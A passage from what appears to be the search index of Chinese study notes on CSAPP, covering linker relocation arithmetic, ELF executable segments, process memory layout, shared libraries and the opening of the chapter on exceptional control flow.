<code>sum</code> \u5728\u5f15\u7528\u7684\u8fd0\u884c\u65f6\u5730\u5740\u53ef\u4ee5\u7531\u51fd\u6570 <code>main</code> \u7684\u5730\u5740\u4e0e <code>r.offset</code> \u76f8\u52a0\u5f97\u5230\uff1a</p> <p>\u5148\u524d\u6211\u4eec\u5047\u8bbe <code>.text</code> \u8d77\u59cb\u5730\u5740\u4e3a <code>0x4004d0</code> \uff0c\u51fd\u6570 <code>main</code> \u8d77\u59cb\u5730\u5740\u81ea\u7136\u5c31\u662f <code>.text</code> \u7684\u8d77\u59cb\u5730\u5740\uff0c\u4e14\u539f\u4e66\u6709\u5047\u8bbe\u51fd\u6570 <code>sum</code> \u7684\u5730\u5740\u4e3a <code>0x4004e8</code> \uff0c\u90a3\u4e48\u6839\u636e\u5730\u5740\u4e4b\u95f4\u7684\u5173\u7cfb\uff0c\u6709\uff1a</p> <pre><code>ref_addr = ADDR(main) + r.offset\n         = 0x4004d0 + 0xf\n         = 0x4004df\n*ref_ptr = ADDR(sum) - ref_addr + r.addend\n         = 0x4004e8 - 0x4004df + (-4)\n         = 0x5\n</code></pre> <p>\u5b9e\u9645\u4e0a\uff0c\u8fd9\u4e00\u6b65\u5c31\u662f\u6c42\u4e24\u4e2a\u5730\u5740\u95f4\u7684\u76f8\u5bf9\u4f4d\u7f6e\uff0c\u6700\u7ec8\u4fee\u6539\u5f97\u5230\u8be5 <code>call</code> \u6307\u4ee4\u5728\u53ef\u6267\u884c\u7a0b\u5e8f\u4e2d\u7684\u5f62\u5f0f\u4e3a\uff1a</p> <pre><code>e:       e8 00 00 00 00     callq  13&lt;main+13&gt;\n         \u2193 \u2193 \u2193 \u2193 \u2193 \u2193 \u2193 \u2193 \u2193 \u2193 \u2193 \u2193 \n4004de:  e8 05 00 00 00     callq  4004e8&lt;sum&gt;\n</code></pre> <p><code>addend</code></p> <p>\u5f53\u7a0b\u5e8f\u6267\u884c\u5230\u8be5 <code>call</code> \u6307\u4ee4\u65f6\uff0cPC \u7684\u503c\u4e3a <code>0x4004e3</code> \uff0c\u5373\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\uff0c\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48\u8ba1\u7b97\u65f6\u9700\u8981\u52a0\u4e0a <code>r.addend</code></p> <p>PC \u5df2\u7ecf\u5b58\u50a8\u7740\u4e0b\u4e00\u6761\u6307\u4ee4 <code>add</code> \u7684\u5730\u5740\uff0c\u4f46\u56e0\u4e3a\u6307\u4ee4 <code>call</code> \u8981\u6267\u884c\u51fd\u6570\u8c03\u7528\u5b9e\u73b0\u8df3\u8f6c\uff0c\u8fd9\u65f6\u5019\u7a0b\u5e8f\uff1a</p> <p>(1) \u628a <code>add</code> \u7684\u5730\u5740(\u5f53\u524d PC \u7684\u503c)\u538b\u6808\u4fdd\u5b58</p> <p>(2) \u4fee\u6539 PC \u7684\u503c\uff0c\u5c06\u5f53\u524d PC \u7684\u503c\u52a0\u4e0a\u504f\u79fb\u91cf <code>0x5</code> \uff0c\u5f97\u5230 <code>sum</code> \u7684\u5730\u5740 <code>0x4004e8</code> </p>"},{"location":"Accumulation/CSAPP/Chapter7/#_9","title":"\u91cd\u5b9a\u4f4d\u7edd\u5bf9\u5f15\u7528","text":"<p>\u6307\u4ee4 <code>mov</code> \u5c1d\u8bd5\u628a <code>array</code> \u7684\u8d77\u59cb\u5730\u5740\u4f20\u7ed9\u5bc4\u5b58\u5668 <code>%edi</code> \uff0c\u8fd9\u4e00\u6761\u6307\u4ee4\u7684\u8d77\u59cb\u5730\u5740\u4e3a <code>0x9</code> \uff0c\u64cd\u4f5c\u7801\u4e3a <code>0xbf</code> \uff0c\u540e\u9762\u88ab\u586b\u5145\u4e3a 0 \u7684\u5185\u5bb9\u5373\u5bf9\u7b26\u53f7 <code>array</code> \u5f15\u7528\u7684\u7edd\u5bf9\u5730\u5740</p> <pre><code>9:   bf 00 00 00 00          mov    $0x0, %edi\n</code></pre> <p>\u5bf9\u7b26\u53f7 <code>array</code> \u7684\u5f15\u7528\u4e5f\u5bf9\u5e94\u4e00\u6761\u53ef\u91cd\u5b9a\u4f4d\u6761\u76ee\uff1a</p> <pre><code>r.offset = 0xa\nr.symbol = array\nr.type = R_X86_64_32\nr.append = 0\n</code></pre> <p><code>offset</code> \u5b57\u6bb5\u544a\u8bc9\u7f16\u8bd1\u5668\u8981\u4ece\u504f\u79fb\u91cf <code>0xa</code> \u5904\u5f00\u59cb\u4fee\u6539\uff08\u5373 <code>mov</code> \u6307\u4ee4\u5f15\u7528\u5730\u5740\u8d77\u59cb\u4f4d\u7f6e\uff09</p> <p>\u5047\u8bbe\u94fe\u63a5\u5668\u5df2\u7ecf\u786e\u5b9a <code>array</code> \u6240\u5728\u7684 <code>.data</code> \u4f4d\u4e8e <code>0x601018</code> \uff0c\u90a3\u4e48\u8fd9\u91cc\u7684\u7edd\u5bf9\u5730\u5740\u5f15\u7528\u4e3a\uff1a</p> <pre><code>*ref_ptr = ADDR(array) + r.addend\n         = 0x601018 + 0x0\n</code></pre> <p>\u90a3\u4e48\u6700\u7ec8\u4fee\u6539\u6307\u4ee4\u4e3a\uff1a</p> <pre><code>9:      bf 00 00 00 00      mov  $0x0, %edi\n        \u2193 \u2193 \u2193 \u2193 \u2193 \u2193 \u2193 \u2193 \u2193 \u2193 \u2193 \u2193 \n4004d9: bf 18 10 60 00      mov  $0x601018, %edi\n</code></pre> <p>\u56e0\u4e3a\u662f <code>x86</code> \uff0c\u6240\u4ee5\u81ea\u7136\u662f\u5c0f\u7aef\u6cd5\u54e6~</p> <p>\u7efc\u4e0a\u6240\u8ff0\uff0c\u4fee\u6539\u7ed3\u679c\u4e3a\uff1a</p> <pre><code>00000000004004d0 &lt;main&gt;:\n   4004d0:   48 83 ec 08        mov    $0x8 ,%rsp\n   4004d4:   be 02 00 00 00     mov    $0x2, %esi\n   4004d9:   bf 18 10 60 00     mov    $0x0, %edi\n   4004de:   e8 05 00 00 00     callq  4004e8&lt;sum&gt;\n   4004e3:   48 83 c4 08        add    $0x8, %rsp\n   4004e7:   c3    \n00000000004004e8 &lt;sum&gt;:\n    ... ...\n</code></pre>"},{"location":"Accumulation/CSAPP/Chapter7/#_10","title":"\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6","text":"<p>\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\u683c\u5f0f\u4e0e\u4e4b\u524d\u4ecb\u7ecd\u7684\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\u683c\u5f0f\u7c7b\u4f3c</p> <p></p> <ul> <li><code>ELF header</code> \u63cf\u8ff0\u4e86\u6587\u4ef6\u7684\u6574\u4f53\u683c\u5f0f\uff0c\u5305\u62ec\u7a0b\u5e8f\u7684\u5165\u53e3\uff0c\u5373\u7a0b\u5e8f\u8fd0\u884c\u65f6\u6267\u884c\u7684\u7b2c\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740</li> <li>\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u7684 <code>.init</code> section \u5b9a\u4e49\u4e86\u4e00\u4e2a\u540d\u4e3a <code>_init</code> \u7684\u51fd\u6570\uff0c\u7a0b\u5e8f\u7684\u521d\u59cb\u5316\u4ee3\u7801\u4f1a\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u8fdb\u884c\u521d\u59cb\u5316</li> <li>\u5176\u5b83 section \u529f\u80fd\u4e0e\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\u4e2d\u5bf9\u5e94\u8282\u529f\u80fd\u76f8\u540c\uff0c\u4e0d\u8fc7\u5df2\u7ecf\u7ecf\u8fc7\u91cd\u5b9a\u4f4d\u5230\u6700\u7ec8\u8fd0\u884c\u5185\u5b58\u5730\u5740\u4e0a\uff0c\u56e0\u6b64\u4e0d\u518d\u9700\u8981 <code>.rel</code> \u76f8\u5173\u7684 section</li> <li>\u7a0b\u5e8f\u8fd0\u884c\u65f6\uff0c\u4ee3\u7801\u6bb5\u548c\u6570\u636e\u6bb5\u9700\u8981\u88ab\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u6267\u884c\uff0c\u7b26\u53f7\u8868\u548c\u8c03\u8bd5\u4fe1\u606f\u4e0d\u4f1a\u88ab\u52a0\u8f7d\u5230\u5185\u5b58</li> </ul> <p>Segment header table \u63cf\u8ff0\u4e86\u4ee3\u7801\u6bb5\u3001\u6570\u636e\u6bb5\u4e0e\u5185\u5b58\u7684\u6620\u5c04\u5173\u7cfb\uff0c\u4ee5\u4e00\u4e2a\u4f8b\u5b50\u8bb2\u89e3\u5176\u4e2d\u5404\u4e2a\u5b57\u6bb5\u4ee3\u8868\u7684\u542b\u4e49\uff1a</p> <p></p> <p>\u5bf9\u4e8e Read-only code segment </p> <ul> <li><code>off</code> \u8868\u793a\u8fd9\u4e2a\u6bb5\u5728\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u7684\u504f\u79fb\u91cf\uff0c\u7531\u4e8e\u4ee3\u7801\u6bb5\u4f4d\u4e8e\u53ef\u6267\u884c\u6587\u4ef6\u7684\u5f00\u59cb\u5904\uff0c\u6240\u4ee5 <code>off</code> \u7b49\u4e8e 0</li> <li><code>vaddr</code> \u548c <code>paddr</code> \u8868\u660e\u8be5\u6bb5\u5f00\u59cb\u4e8e\u5185\u5b58\u5730\u5740 <code>0x400000</code> \u5904</li> <li>\u4ee3\u7801\u6bb5\u5927\u5c0f <code>filesz</code> \u4e3a <code>0x69c</code> \u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u5728\u5185\u5b58\u4e2d\u4e5f\u5360\u7528 <code>memsz</code> \uff0c<code>0x69c</code> \u5b57\u8282<ul> <li>\u8fd9\u4e9b\u5185\u5bb9\u5305\u62ec <code>ELF header</code> , \u7a0b\u5e8f\u5934\u90e8\u8868 , <code>.init</code> , <code>.text</code> , <code>.rodata</code> \u7b49\u5185\u5bb9</li> </ul> </li> <li>\u672b\u5c3e\u7684 <code>flags</code> \u6807\u8bc6\u8868\u660e\u8be5\u6bb5\u53ea\u6709\u8bfb\u548c\u6267\u884c\u7684\u6743\u9650\uff0c\u5176\u4e2d <code>r</code> \u8868\u793a\u8bfb\uff0c <code>x</code> \u8868\u793a\u6267\u884c\uff0c <code>-</code> \u8868\u793a\u6ca1\u6709\u5199\u5165\u7684\u6743\u9650</li> </ul> <p>\u8981\u6c42 <code>vaddr % align = off % align</code></p> <p>\u5176\u5b9e\u662f\u7528\u6765\u5bf9\u9f50\uff0c\u662f\u7684\u7a0b\u5e8f\u6267\u884c\u8fc7\u7a0b\u4e2d\uff0c\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u7684\u6bb5\u80fd\u591f\u9ad8\u6548\u4f20\u5165\u5185\u5b58\u4e2d</p> <p>\u5bf9\u4e8e Read/Write data segment </p> <p>\u8d77\u59cb\u5730\u5740\u4e3a <code>0x600df8</code> \uff0c\u8fd9\u4e2a segment \u5728\u76ee\u6807\u6587\u4ef6\u4e2d\u5360 <code>0x228</code> \u5b57\u8282\uff0c\u4e0d\u8fc7\u5728\u5185\u5b58\u4e2d\u5360\u7528 <code>0x230</code> \u5b57\u8282\uff0c\u591a\u51fa\u6765\u7684\u516b\u4e2a\u5b57\u8282\u7528\u6765\u5b58\u653e <code>.bss section</code> \u7684\u6570\u636e</p> <p><code>.bss</code> \u4e0d\u5360\u7528\u53ef\u6267\u884c\u6587\u4ef6\u7a7a\u95f4\uff0c\u4f46\u662f\u8fd0\u884c\u65f6\u9700\u8981\u88ab\u521d\u59cb\u5316\u4e3a 0</p> <p>\u6bcf\u4e00\u4e2a Linux \u7a0b\u5e8f\u5728\u8fd0\u884c\u65f6\u90fd\u6709\u4e00\u4e2a\u5185\u5b58\u955c\u50cf\u3002</p> <p></p> <p>\u5728 Linux x86-64 \u7cfb\u7edf\u4e2d\uff0c\u4ee3\u7801\u6bb5\u603b\u662f\u4ece\u5730\u5740 <code>0x400000</code> \u5f00\u59cb\uff0c\u4ee3\u7801\u6bb5\u540e\u662f\u6570\u636e\u6bb5\uff0c\u8fd0\u884c\u65f6\u4ea7\u751f\u7684\u5806\u5728\u6570\u636e\u6bb5\u4e4b\u540e\u3002</p> <p>\u5806\u7684\u589e\u957f\u65b9\u5411\u662f\u4ece\u4f4e\u5730\u5740\u5230\u9ad8\u5730\u5740\uff0c\u4f8b\u5982 C \u8bed\u8a00\u7684 <code>malloc</code> \u51fd\u6570\u7533\u8bf7\u7684\u7a7a\u95f4\u5c31\u5c5e\u4e8e\u5806\u3002</p> <p>\u5806\u540e\u9762\u7684\u533a\u57df\u662f\u4e3a\u5171\u4eab\u533a\u57df\u4fdd\u7559\u7684\uff0c\u8fd9\u4e2a\u533a\u57df\u5c06\u5806\u548c\u6808\u9694\u5f00\u3002</p> <p>\u7528\u6237\u6808\u7684\u8d77\u59cb\u5730\u5740\u4e3a \\(2^{48}-1\\) \uff0c\u8fd9\u4e5f\u662f\u6700\u5927\u7684\u5408\u6cd5\u7528\u6237\u5730\u5740\uff0c\u6808\u7684\u589e\u957f\u65b9\u5411\u662f\u4ece\u9ad8\u5730\u5740\u5230\u4f4e\u5730\u5740\u3002</p> <p>\u5730\u5740 \\(2^{48}\\)  \u4ee5\u4e0a\u7684\u5730\u5740\uff0c\u4e3a\u64cd\u4f5c\u7cfb\u7edf\u7684\u4ee3\u7801\u548c\u6570\u636e\u4fdd\u7559\uff0c\u8fd9\u90e8\u5206\u5185\u5b58\u7a7a\u95f4\u5806\u7528\u6237\u4ee3\u7801\u4e0d\u53ef\u89c1</p> <p>\u5b9e\u9645\u4e0a\u7531\u4e8e\u6570\u636e\u6bb5\u5730\u5740\u5bf9\u9f50\u7684\u8981\u6c42\uff0c\u4ee3\u7801\u6bb5\u548c\u6570\u636e\u6bb5\u4e4b\u95f4\u5b58\u5728\u95f4\u9699</p> <p>\u7a0b\u5e8f\u8fd0\u884c\uff0c\u52a0\u8f7d\u5668\u4e3a\u7a0b\u5e8f\u521b\u9020\u51fa\u4e0a\u56fe\u5185\u5b58\u955c\u50cf\uff0c\u6839\u636e\u7a0b\u5e8f\u5934\u90e8\u8868\u7684\u5185\u5bb9\uff0c\u52a0\u8f7d\u5668\u5c06\u53ef\u6267\u884c\u6587\u4ef6\u7684\u4ee3\u7801\u6bb5\u548c\u6570\u636e\u6bb5\u590d\u5236\u5230\u5185\u5b58\u76f8\u5e94\u7684\u4f4d\u7f6e</p> <p>\u63a5\u4e0b\u6765\uff0c\u52a0\u8f7d\u5668\u8df3\u8f6c\u5230\u7a0b\u5e8f\u7684\u5165\u53e3\uff0c\u5373 <code>_start</code> \u51fd\u6570\u6240\u5728\u5730\u5740\uff0c<code>_start</code> \u8c03\u7528\u7cfb\u7edf\u542f\u52a8\u51fd\u6570 <code>__libc_start_main</code> \uff0c\u8fdb\u884c\u521d\u59cb\u5316\u6267\u884c\u73af\u5883\uff0c\u5e76\u8c03\u7528\u7528\u6237\u5c42\u7684 <code>main</code> \u51fd\u6570</p> <p>\u5b9e\u9645\u4e0a\uff0c\u60f3\u8981\u660e\u767d\u7a0b\u5e8f\u52a0\u8f7d\u662f\u5982\u4f55\u5de5\u4f5c\u7684\uff0c\u9700\u8981\u4e86\u89e3\u8fdb\u7a0b\u3001\u865a\u62df\u5185\u5b58\u4ee5\u53ca\u5185\u5b58\u6620\u5c04\u7684\u6982\u5ff5\uff0c\u8fd9\u4e9b\u5185\u5bb9\u5728 Chapter 8 \u548c Chapter 9 \u8be6\u7ec6\u4ecb\u7ecd</p>"},{"location":"Accumulation/CSAPP/Chapter7/#_11","title":"\u52a8\u6001\u94fe\u63a5\u5171\u4eab\u5e93","text":"<p>\u5171\u4eab\u5e93\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\uff0c\u5728 Linux \u7cfb\u7edf\u4e2d\u540e\u7f00\u901a\u5e38\u4e3a <code>.so</code> </p> <p>Windows \u4e2d <code>.dll</code> \u7ed3\u5c3e\u7684\u6587\u4ef6\u4e5f\u5c5e\u4e8e\u5171\u4eab\u5e93 (Dynamic Link Library)</p> <p>\u5171\u4eab\u5e93\u5728\u8fd0\u884c\u6216\u52a0\u8f7d\u65f6\uff0c\u53ef\u4ee5\u88ab\u52a0\u8f7d\u5230\u4efb\u610f\u7684\u5185\u5b58\u5730\u5740\uff0c\u8fd8\u80fd\u548c\u4e00\u4e2a\u5728\u5185\u5b58\u4e2d\u8fd0\u884c\u7684\u7a0b\u5e8f\u8fdb\u884c\u94fe\u63a5\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u5373 \u52a8\u6001\u94fe\u63a5 \uff0c\u5177\u4f53\u662f\u7531\u52a8\u6001\u94fe\u63a5\u5668\u6765\u6267\u884c\u7684</p> <p>\u4e4b\u524d\u7684\u5c0f\u8282\u4e2d\u6211\u4eec\u66fe\u7528 <code>ar rcs libvector.a addvec.o multvec.o</code> \u6765\u521b\u5efa\u4e00\u4e2a\u9759\u6001\u5e93\uff0c\u5bf9\u4e8e\u5171\u4eab\u5e93\u7684\u521b\u5efa\uff0c\u6240\u7528\u547d\u4ee4\u5982\u4e0b\uff1a</p> <pre><code>gcc -shared -fpic -o libvector.so addvec.o multvec.o\n</code></pre> <p>\u5176\u4e2d <code>-shared</code> \u9009\u9879\u662f\u6307\u793a\u7f16\u8bd1\u5668\u521b\u5efa\u4e00\u4e2a\u5171\u4eab\u7684\u76ee\u6807\u6587\u4ef6\uff1b<code>-fpic</code> \u9009\u9879\u544a\u8bc9\u7f16\u8bd1\u5668\u751f\u6210\u4f4d\u7f6e\u65e0\u5173\u7684\u4ee3\u7801\uff0c\u4f7f\u5f97\u5171\u4eab\u5e93\u53ef\u4ee5\u88ab\u52a0\u8f7d\u5230\u4efb\u610f\u5185\u5b58\u4f4d\u7f6e</p> <p>\u5f97\u5230\u540d\u4e3a <code>libvector.so</code> \u7684\u5171\u4eab\u5e93\u540e\uff0c\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u5e93\u6765\u6784\u9020\u53ef\u6267\u884c\u7a0b\u5e8f\uff1a</p> <pre><code>gcc -o prog2 main.c ./libvector.so\n</code></pre> <p>\u76f8\u6bd4\u4e8e\u9759\u6001\u5e93\u7684\u94fe\u63a5\uff0c\u5171\u4eab\u5e93 <code>libvector.so</code> \u7684\u5185\u5bb9\u5e76\u6ca1\u6709\u88ab\u590d\u5236\u5230\u53ef\u6267\u884c\u6587\u4ef6 <code>prog2</code> \u4e2d\uff0c\u8fd9\u4e2a\u64cd\u4f5c\u53ea\u662f\u590d\u5236\u4e86\u7b26\u53f7\u8868\u548c\u4e00\u4e9b\u91cd\u5b9a\u4f4d\u4fe1\u606f\u3002</p> <p>\u5f53\u53ef\u6267\u884c\u7a0b\u5e8f <code>prog2</code> \u88ab\u52a0\u8f7d\u8fd0\u884c\u65f6\uff0c\u52a0\u8f7d\u5668\u4f1a\u53d1\u73b0\u7a0b\u5e8f\u4e2d\u5b58\u5728\u4e00\u4e2a\u540d\u4e3a <code>.interp</code> \u7684 section \uff0c\u8fd9\u4e2a section \u5305\u542b\u4e86\u52a8\u6001\u94fe\u63a5\u5668\u7684\u8def\u5f84\u540d\uff0c\u52a0\u8f7d\u5668\u5c06\u8fd9\u4e2a\u52a8\u6001\u94fe\u63a5\u5668\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u8fd0\u884c\uff0c\u7531\u52a8\u6001\u94fe\u63a5\u5668\u6267\u884c\u91cd\u5b9a\u4f4d\u4ee3\u7801\u548c\u6570\u636e\u7684\u5de5\u4f5c</p> <p>\u5b9e\u9645\u4e0a\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u672c\u8eab\u4e5f\u662f\u4e00\u4e2a\u5171\u4eab\u76ee\u6807\u6587\u4ef6(<code>ld-linux.so</code>)</p> <ul> <li>\u8bb8\u591a Windows \u5e94\u7528\u5f00\u53d1\u8005\u5e38\u5e38\u5229\u7528\u5171\u4eab\u5e93\u6765\u8fdb\u884c\u8f6f\u4ef6\u7248\u672c\u7684\u66f4\u65b0<ul> <li>\u5171\u4eab\u5e93\u7248\u672c\u66f4\u65b0\u540e\uff0c\u7528\u6237\u5c06\u5176\u4e0b\u8f7d\u4e0b\u6765\uff0c\u4e0b\u4e00\u6b21\u8fd0\u884c\u65f6\uff0c\u5e94\u7528\u7a0b\u5e8f\u5c06\u81ea\u52a8\u94fe\u63a5\u548c\u52a0\u8f7d\u65b0\u7684\u5171\u4eab\u5e93</li> </ul> </li> <li>\u52a8\u6001\u94fe\u63a5\u8fd8\u53ef\u4ee5\u7528\u6765\u6784\u5efa\u9ad8\u6027\u80fd\u7684 Web \u670d\u52a1\u5668\uff0c\u5982\u751f\u6210\u52a8\u6001\u5185\u5bb9<ul> <li>\u5b9e\u73b0\u601d\u8def\u662f\u5c06\u6bcf\u4e2a\u751f\u6210\u52a8\u6001\u5185\u5bb9\u7684\u51fd\u6570\u6253\u5305\u5230\u5171\u4eab\u5e93\u4e2d\uff0c\u5f53\u4e00\u4e2a\u6765\u81ea\u6d4f\u89c8\u5668\u7684\u8bf7\u6c42\u5230\u8fbe\u65f6\uff0cWeb \u670d\u52a1\u5668\u52a8\u6001\u5730\u52a0\u8f7d\u548c\u94fe\u63a5\u9002\u5f53\u5730\u51fd\u6570\uff0c\u7136\u540e\u8fdb\u884c\u8c03\u7528\u3002\u7531\u4e8e\u51fd\u6570\u4f1a\u4e00\u76f4\u7f13\u5b58\u5728\u670d\u52a1\u5668\u5730\u5730\u5740\u7a7a\u95f4\u4e2d\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u4e00\u4e2a\u7b80\u5355\u7684\u51fd\u6570\u8c03\u7528\u5c31\u53ef\u4ee5\u5904\u7406\u4e4b\u540e\u7684\u8bf7\u6c42</li> </ul> </li> </ul> <p>\u52a8\u6001\u94fe\u63a5\u548c\u9759\u6001\u94fe\u63a5\u7684\u4f18\u7f3a\u70b9\u5982\u4e0b\uff1a</p> <p>\u9759\u6001\u94fe\u63a5\u5e93\u7684\u4f18\u70b9\uff1a</p> <ul> <li>\u4ee3\u7801\u88c5\u8f7d\u901f\u5ea6\u5feb\uff0c\u6267\u884c\u901f\u5ea6\u6bd4\u52a8\u6001\u94fe\u63a5\u5e93\u5feb</li> <li>\u5f00\u53d1\u8005\u53d1\u5e03\u7684\u65f6\u5019\u4e0d\u9700\u8981\u7ba1\u7528\u6237\u7535\u8111\u4e2d\u662f\u5426\u5177\u5907\u7a0b\u5e8f\u8fd0\u884c\u6240\u9700\u7684\u73af\u5883</li> </ul> <p>\u52a8\u6001\u94fe\u63a5\u5e93\u7684\u4f18\u70b9\uff1a</p> <ul> <li>\u66f4\u52a0\u8282\u7701\u5185\u5b58\u5e76\u51cf\u5c11\u9875\u9762\u4ea4\u6362</li> <li>\u5e93\u6587\u4ef6\u4e0e\u53ef\u6267\u884c\u6587\u4ef6\u72ec\u7acb\uff0c\u53ea\u8981\u8f93\u51fa\u63a5\u53e3\u4e0d\u53d8\uff0c\u66f4\u6362\u5e93\u6587\u4ef6\u4e0d\u4f1a\u5bf9\u53ef\u6267\u884c\u6587\u4ef6\u9020\u6210\u4efb\u4f55\u5f71\u54cd\uff0c\u56e0\u800c\u6781\u5927\u5730\u63d0\u9ad8\u4e86\u53ef\u7ef4\u62a4\u6027\u548c\u53ef\u6269\u5c55\u6027</li> <li>\u4e0d\u540c\u7f16\u7a0b\u8bed\u8a00\u7f16\u5199\u7684\u7a0b\u5e8f\u53ea\u8981\u6309\u7167\u51fd\u6570\u8c03\u7528\u7ea6\u5b9a\u5c31\u53ef\u4ee5\u8c03\u7528\u540c\u4e00\u4e2a\u5e93</li> <li>\u9002\u7528\u4e8e\u5927\u89c4\u6a21\u7684\u8f6f\u4ef6\u5f00\u53d1\uff0c\u4f7f\u5f00\u53d1\u8fc7\u7a0b\u72ec\u7acb\u3001\u8026\u5408\u5ea6\u5c0f\uff0c\u4fbf\u4e8e\u4e0d\u540c\u5f00\u53d1\u8005\u548c\u5f00\u53d1\u7ec4\u7ec7\u4e4b\u95f4\u8fdb\u884c\u5f00\u53d1\u548c\u6d4b\u8bd5</li> </ul>"},{"location":"Accumulation/CSAPP/Chapter8/","title":"CH 8. \u5f02\u5e38\u63a7\u5236\u6d41","text":""},{"location":"Accumulation/CSAPP/Chapter8/#chapter-8-exceptional-control-flow","title":"Chapter 8. Exceptional Control Flow","text":"<p> \u7ea6 2990 \u4e2a\u5b57  40 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 15 \u5206\u949f</p> <p>\u5f02\u5e38\u63a7\u5236\u6d41\u662f\u64cd\u4f5c\u7cfb\u7edf\u7528\u6765\u5b9e\u73b0I/O\u3001\u8fdb\u7a0b\u4ee5\u53ca\u865a\u62df\u5185\u5b58\u7684\u57fa\u672c\u673a\u5236</p> <p>\u4e0d\u5e73\u6ed1\u7684\u63a7\u5236\u6d41\uff08PC \u6267\u884c\u7684\u76f8\u90bb\u4e24\u6761\u6307\u4ee4\u5728\u5730\u5740\u4e0a\u4e0d\u76f8\u90bb\uff09\u901a\u5e38\u662f\u7531\u8df3\u8f6c\u3001\u8c03\u7528\u548c\u8fd4\u56de\u8fd9\u4e9b\u7a0b\u5e8f\u6307\u4ee4\u6240\u9020\u6210\u7684</p> <p>\u73b0\u4ee3\u7cfb\u7edf\u901a\u8fc7\u4f7f\u63a7\u5236\u6d41\u53d1\u751f\u7a81\u53d8\u5bf9\u8fd9\u4e9b\u60c5\u51b5\u505a\u51fa\u53cd\u5e94\u3002\u6211\u4eec\u79f0\u8fd9\u79cd\u7a81\u53d8\u4e3a \u5f02\u5e38\u63a7\u5236\u6d41 (\u00a0Exceptional Control Flow,<code>ECF</code>)</p>"},{"location":"Accumulation/CSAPP/Chapter8/#_1","title":"\u5f02\u5e38","text":"<p>\u7cfb\u7edf\u4e2d\u4e3a\u6bcf\u79cd\u7c7b\u578b\u7684\u5f02\u5e38\u90fd\u5206\u914d\u4e86\u552f\u4e00\u7684\u5f02\u5e38\u7f16\u53f7\uff0c\u5176\u4e2d\u4e00\u4e9b\u7f16\u53f7\u662f\u7531\u5904\u7406\u5668\u7684\u8bbe\u8ba1\u8005\u5206\u914d\u7684\uff0c\u5982\u88ab\u96f6\u9664\u3001\u7f3a\u9875\u3001\u7b97\u6570\u8fd0\u7b97\u6ea2\u51fa\u7b49\uff0c\u5176\u5b83\u53f7\u7801\u662f\u7531\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u8bbe\u8ba1\u8005\u5206\u914d\u7684\uff0c\u5982\u7cfb\u7edf\u8c03\u7528\u4ee5\u53ca\u6765\u81ea\u5916\u90e8I/O\u8bbe\u5907\u7684\u4fe1\u53f7</p> <p>\u5f53\u5904\u7406\u5668\u68c0\u6d4b\u5230\u5f02\u5e38\u4e8b\u4ef6\u7684\u53d1\u751f\uff0c\u5e76\u4e14\u786e\u5b9a\u4e86\u76f8\u5e94\u7684\u5f02\u5e38\u7f16\u53f7 <code>k</code> \uff0c\u4f1a\u6839\u636e\u5f02\u5e38\u7f16\u53f7\u4ece\u5f02\u5e38\u8868\uff08Exception Table\uff09\u4e2d\u68c0\u7d22\u5bf9\u5e94\u7684\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u6765\u5904\u7406\u8fd9\u4e2a\u5f02\u5e38</p> <p>Exception Table</p> <p>\u5f02\u5e38\u8868\u662f\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\uff0c\u64cd\u4f5c\u7cfb\u7edf\u5206\u914d\u548c\u521d\u59cb\u5316\u7684\u4e00\u4e2a\u8df3\u8f6c\u8868\uff0c\u5f02\u5e38\u7f16\u53f7\u5373\u4e3a\u8be5\u8df3\u8f6c\u8868\u7684\u7d22\u5f15\uff0c\u8868\u9879\u4e2d\u7684\u5185\u5bb9\u662f\u5bf9\u5e94\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u7684\u8d77\u59cb\u5730\u5740</p> <p>\u5f02\u5e38\u8868\u7684\u8d77\u59cb\u5730\u5740\u4fdd\u5b58\u5728 CPU \u4e2d\u7684\u4e00\u4e2a\u7279\u6b8a\u5bc4\u5b58\u5668\u4e2d</p> <p></p> <p>\u7efc\u4e0a\u6240\u8ff0\uff0c\u5f02\u5e38\u7684\u5904\u7406\u7c7b\u4f3c\u4e00\u79cd\u95f4\u63a5\u7684\u51fd\u6570\u8c03\u7528\u3002\u4e0d\u540c\u7684\u65f6\uff0c\u5f53\u53d1\u751f\u51fd\u6570\u8c03\u7528\u65f6\uff0c\u5728\u8df3\u8f6c\u5230\u76ee\u6807\u51fd\u6570\u524d\uff0c\u5904\u7406\u5668\u9996\u5148\u5c06\u8fd4\u56de\u5730\u5740\u538b\u5165\u6808\u4e2d\uff1b\u7136\u800c\u6839\u636e\u5f02\u5e38\u7c7b\u578b\uff0c\u5f02\u5e38\u5904\u7406\u7684\u8fd4\u56de\u7c7b\u578b\u8981\u4e48\u662f\u5f53\u524d\u6307\u4ee4\uff0c\u8981\u4e48\u662f\u4e0b\u4e00\u6761\u6307\u4ee4\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u5904\u7406\u5668\u5904\u7406\u5f02\u5e38\u65f6\uff0c\u9700\u8981\u989d\u5916\u5c06\u5904\u7406\u5668\u4e00\u4e9b\u72b6\u6001\u538b\u5165\u6808\u4e2d\uff0c\u88ab\u4e2d\u65ad\u7684\u7a0b\u5e8f\u91cd\u65b0\u5f00\u59cb\u6267\u884c\u65f6\u53d6\u51fa\u5e76\u6062\u5